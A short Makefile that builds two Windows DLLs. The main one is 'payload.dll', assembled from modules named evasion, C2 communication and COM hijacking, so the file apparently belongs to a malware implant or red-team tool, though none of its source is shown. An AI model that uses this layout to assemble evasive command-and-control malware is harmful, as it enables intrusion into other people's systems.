CC = gcc
CXX = g++
CFLAGS = -Wall -Wextra -O2 -fPIC
CXXFLAGS = -Wall -Wextra -O2 -fPIC
LDFLAGS = -shared -ladvapi32 -lws2_32

all: payload.dll sentinel.dll

payload.dll: payload.o evasion.o c2_communication_fixed.o main.o com_hijack.o
	$(CC) $(LDFLAGS) -o $@ $^

sentinel.dll: sentinel_dll.o
	$(CXX) $(LDFLAGS) -o $@ $^

payload.o: payload.c payload.h payload_config.h
	$(CC) $(CFLAGS) -c -o $@ $<

evasion.o: evasion.c evasion.h
	$(CC) $(CFLAGS) -c -o $@ $<

c2_communication_fixed.o: c2_communication_fixed.c c2_communication_fixed.h config.h
	$(CC) $(CFLAGS) -c -o $@ $<

com_hijack.o: com_hijack.c com_hijack.h com_hijack_config.h
	$(CC) $(CFLAGS) -c -o $@ $<

main.o: main.c payload.h evasion.h c2_communication_fixed.h com_hijack.h com_hijack_config.h
	$(CC) $(CFLAGS) -c -o $@ $<

sentinel_dll.o: sentinel_dll.cpp sentinel_dll.h
	$(CXX) $(CXXFLAGS) -c -o $@ $<

clean:
	rm -f *.o payload.dll sentinel.dll